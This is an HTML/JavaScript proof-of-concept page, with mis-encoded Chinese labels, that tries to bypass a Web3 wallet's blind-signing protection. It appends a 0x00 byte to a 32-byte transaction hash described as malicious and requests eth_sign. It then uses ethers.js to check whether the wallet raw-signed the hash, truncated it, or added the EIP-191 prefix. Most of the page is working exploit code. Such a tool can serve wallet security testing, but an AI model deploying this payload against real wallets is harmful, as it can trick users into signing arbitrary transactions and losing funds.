<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>0x00 ç»•è¿‡ä¸ç­¾ååº•å±‚çœŸä¼ªç»ˆæé‰´å®šå™¨</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
    <style>
        body { font-family: monospace; max-width: 900px; margin: 20px auto; padding: 25px; background-color: #f8f9fa; color: #333; }
        h2 { color: #212529; border-bottom: 2px solid #dee2e6; padding-bottom: 10px; }
        button { padding: 12px 24px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #0d6efd; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 15px; transition: 0.2s;}
        button.exploit { background-color: #dc3545; }
        button:hover { opacity: 0.85; transform: translateY(-1px); }
        button:disabled { background-color: #adb5bd; cursor: not-allowed; transform: none; }
        #console { background: #212529; color: #20c997; padding: 20px; border-radius: 8px; height: 450px; overflow-y: auto; white-space: pre-wrap; font-size: 14px; border: 1px solid #495057; line-height: 1.6; box-shadow: inset 0 0 10px rgba(0,0,0,0.5); }
        .highlight { color: #ffc107; font-weight: bold; }
        .danger-text { color: #ff4d4d; font-weight: bold; }
        .safe-text { color: #0dcaf0; font-weight: bold; }
    </style>
</head>
<body>
    <h2>0x00 ç»•è¿‡ä¸ç­¾ååº•å±‚çœŸä¼ªç»ˆæé‰´å®šå™¨</h2>
    <div style="margin-bottom: 20px; font-size: 14px; color: #6c757d;">
        <b>æ‰§è¡Œé€»è¾‘ï¼š</b> æ³¨å…¥å« 0x00 çš„ 33 å­—èŠ‚ç•¸å½¢äº¤æ˜“å“ˆå¸Œ -> å‡»ç©¿æ‹¦æˆªå”¤èµ· UI -> æ•è·ç­¾å -> æœ¬åœ° 4 ç»´å¯†ç å­¦åæ¨éªŒè¯ã€‚
    </div>

    <div>
        <button id="btnConnect">1. è¿æ¥æµ‹è¯•é’±åŒ…</button>
        å½“å‰åœ°å€: <span id="walletAddress" style="font-weight: bold; color: #0d6efd;">æœªè¿æ¥</span>
    </div>

    <div style="margin-top: 20px; padding-top: 20px; border-top: 1px dashed #ced4da;">
        <button id="btnBypass" class="exploit" disabled>2. å‘é€ 0x00 ç»•è¿‡å¹¶é‰´å®šçœŸä¼ª</button>
    </div>

    <h3 style="margin-top: 30px; color: #495057;">æ·±åº¦é€†å‘éªŒè¯æ§åˆ¶å°:</h3>
    <div id="console">ç³»ç»Ÿå°±ç»ªï¼Œç­‰å¾…è¿æ¥...</div>

    <script>
        const btnConnect = document.getElementById('btnConnect');
        const btnBypass = document.getElementById('btnBypass');
        const elAddress = document.getElementById('walletAddress');
        const elConsole = document.getElementById('console');
        let currentAccount = null;

        function log(msg) {
            elConsole.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
            elConsole.scrollTop = elConsole.scrollHeight;
        }

        btnConnect.addEventListener('click', async () => {
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    currentAccount = accounts[0]; 
                    elAddress.innerText = currentAccount;
                    log(`âœ… é’±åŒ…è¿æ¥æˆåŠŸã€‚`);
                    btnBypass.disabled = false;
                } catch (e) { log(`âŒ è¿æ¥å¤±è´¥: ${e.message}`); }
            } else { log("âš ï¸ æœªæ£€æµ‹åˆ° Web3 é’±åŒ…ç¯å¢ƒã€‚"); }
        });

        btnBypass.addEventListener('click', async () => {
            if (!currentAccount) return;
            
            // æ„é€ çœŸå®çš„æ¶æ„ 32 å­—èŠ‚äº¤æ˜“å“ˆå¸Œ
            const realTxHash = "0x89c9e5fa472f883b6f007bc9543e2621c1f55b9e0f34033dfd720c24298150a0";
            // å°¾éƒ¨è¿½åŠ  00 å˜æˆ 33 å­—èŠ‚ï¼Œç”¨äºç ´åæ‹¦æˆªå™¨çš„é•¿åº¦å’Œæ­£åˆ™æ ¡éªŒ
            const bypassPayload = realTxHash + "00"; 
            
            log(`\n<span class="highlight">--- ğŸš€ é˜¶æ®µ 1ï¼šå°è¯• 0x00 é•¿åº¦æ¬ºéª—ç»•è¿‡ ---</span>`);
            log(`æ„é€  Payload: çœŸå®äº¤æ˜“å“ˆå¸Œ + 00 æˆªæ–­ç¬¦`);
            log(`å‘é€æ•°æ® (Hex): ${bypassPayload}`);
            
            try {
                const signature = await window.ethereum.request({
                    method: 'eth_sign',
                    params: [currentAccount, bypassPayload]
                });
                
                log(`\n<span class="danger-text">ğŸš¨ [çªç ´é˜²çº¿] é’±åŒ…æœªèƒ½æ‹¦æˆªï¼æˆåŠŸå”¤èµ·å¹¶æ•è·ç­¾å:</span>\n${signature}`);
                log(`\n<span class="highlight">--- ğŸ” é˜¶æ®µ 2ï¼šæ‰§è¡Œåº•å±‚ç­¾åçœŸä¼ªå¯†ç å­¦åæ¨ ---</span>`);
                
                verifyDeepLogic(bypassPayload, realTxHash, signature, currentAccount.toLowerCase());

            } catch (error) {
                log(`ğŸ›¡ï¸ é’±åŒ…å®‰å…¨é˜²çº¿ç”Ÿæ•ˆï¼Œè¯·æ±‚è¢«æ‹¦æˆª: ${error.message}`);
            }
        });

        // æ ¸å¿ƒéªŒè¯å¼•æ“
        function verifyDeepLogic(payloadWith00, realHash, signature, addressLowerCase) {
            if (typeof ethers === 'undefined') { log("âŒ ethers.js æœªåŠ è½½ï¼"); return; }
            let foundMatch = false;

            // éªŒè¯ 1ï¼šå½»åº•çš„çœŸç›²ç­¾ (è¿å¸¦ 0x00 ä¸€èµ·è£¸ç­¾)
            try {
                if (ethers.recoverAddress(payloadWith00, signature).toLowerCase() === addressLowerCase) {
                    log(`\n<span class="danger-text">ğŸ’¥ [è‡´å‘½æ¼æ´ - ç»“è®º A] é’±åŒ…æ‰§è¡Œäº† 100% çš„çœŸ eth_sign ç›²ç­¾ï¼</span>`);
                    log(`åŸç†è§£æï¼šåº•å±‚ç›´æ¥å¯¹åŒ…å« 0x00 çš„ç•¸å½¢å“ˆå¸Œè¿›è¡Œäº† ECDSA è£¸ç­¾ï¼Œæ²¡æœ‰ä»»ä½•å®‰å…¨å‰ç¼€ä¿æŠ¤ã€‚`);
                    foundMatch = true;
                }
            } catch(e) {}

            // éªŒè¯ 2ï¼šæœ€å¯æ€•çš„æˆªæ–­ç›²ç­¾ (è¿‡æ»¤ 0x00 åï¼Œå¯¹çœŸå®çš„ 32 å­—èŠ‚æ¶æ„å“ˆå¸Œè£¸ç­¾)
            if (!foundMatch) {
                try {
                    if (ethers.recoverAddress(realHash, signature).toLowerCase() === addressLowerCase) {
                        log(`\n<span class="danger-text">â˜ ï¸ [æåº¦è‡´å‘½ - ç»“è®º B] é’±åŒ…å‘ç”Ÿäº†åº•å±‚æˆªæ–­ï¼Œå¹¶æ‰§è¡Œäº†çœŸ eth_sign ç›²ç­¾ï¼</span>`);
                        log(`åŸç†è§£æï¼šå¤–å±‚é˜²ç«å¢™è¢« 00 éª—è¿‡ï¼Œä½†åº•å±‚ç­¾åæ¨¡å—å»æ‰äº† 00ï¼Œç›´æ¥å¯¹ä½ çš„ã€çœŸå®æ¶æ„å“ˆå¸Œã€‘è¿›è¡Œäº†è£¸ç­¾ï¼è¿™æ˜¯æœ€å®Œç¾çš„ç»•è¿‡åˆ©ç”¨é“¾ï¼`);
                        foundMatch = true;
                    }
                } catch(e) {}
            }

            // éªŒè¯ 3ï¼šå®‰å…¨çš„ä¼ªè£… (è¿å¸¦ 0x00 åŠ ä¸Šäº† EIP-191 å‰ç¼€)
            if (!foundMatch) {
                try {
                    const bytesWith00 = ethers.getBytes(payloadWith00);
                    if (ethers.verifyMessage(bytesWith00, signature).toLowerCase() === addressLowerCase) {
                        log(`\n<span class="safe-text">ğŸ›¡ï¸ [å®‰å…¨ä¼ªè£… - ç»“è®º C] è¿™æ˜¯æŠ«ç€ eth_sign å¤–è¡£çš„ personal_signã€‚</span>`);
                        log(`åŸç†è§£æï¼šè™½ç„¶ 00 éª—è¿‡äº†å¤–å±‚å”¤èµ·äº†å¼¹çª—ï¼Œä½†åº•å±‚ä¾ç„¶åšå®ˆäº†å®‰å…¨åº•çº¿ï¼Œå¼ºåˆ¶æ‹¼æ¥äº† EIP-191 å‰ç¼€ã€‚è¯¥ç­¾åæ˜¯å®‰å…¨çš„ã€‚`);
                        foundMatch = true;
                    }
                } catch(e) {}
            }

            // éªŒè¯ 4ï¼šæˆªæ–­å¹¶å®‰å…¨ä¼ªè£… (è¿‡æ»¤ 0x00 åï¼ŒåŠ ä¸Š EIP-191 å‰ç¼€)
            if (!foundMatch) {
                try {
                    const realHashBytes = ethers.getBytes(realHash);
                    if (ethers.verifyMessage(realHashBytes, signature).toLowerCase() === addressLowerCase) {
                        log(`\n<span class="safe-text">ğŸ›¡ï¸ [æˆªæ–­ä¸”å®‰å…¨ - ç»“è®º D] å‘ç”Ÿæˆªæ–­ï¼Œä½†æœ€ç»ˆæ˜¯ personal_signã€‚</span>`);
                        log(`åŸç†è§£æï¼šåº•å±‚å»æ‰äº† 00 æ¢å¤äº†çœŸå®çš„å“ˆå¸Œï¼Œä½†ä¾ç„¶å¼ºåˆ¶åŠ ä¸Šäº† EIP-191 å‰ç¼€ã€‚èµ„äº§å®‰å…¨ã€‚`);
                        foundMatch = true;
                    }
                } catch(e) {}
            }

            if (!foundMatch) {
                log(`\nâ“ [è¯¡å¼‚é€»è¾‘] 4 ç»´ç©·ä¸¾å‡æœªå‘½ä¸­ã€‚åº•å±‚åº“çš„è§£æè§„åˆ™å­˜åœ¨æœªçŸ¥çš„å†…å­˜å¼‚å¸¸æˆ–å¡«å……å¤„ç†ã€‚`);
            }
        }
    </script>
</body>
</html>
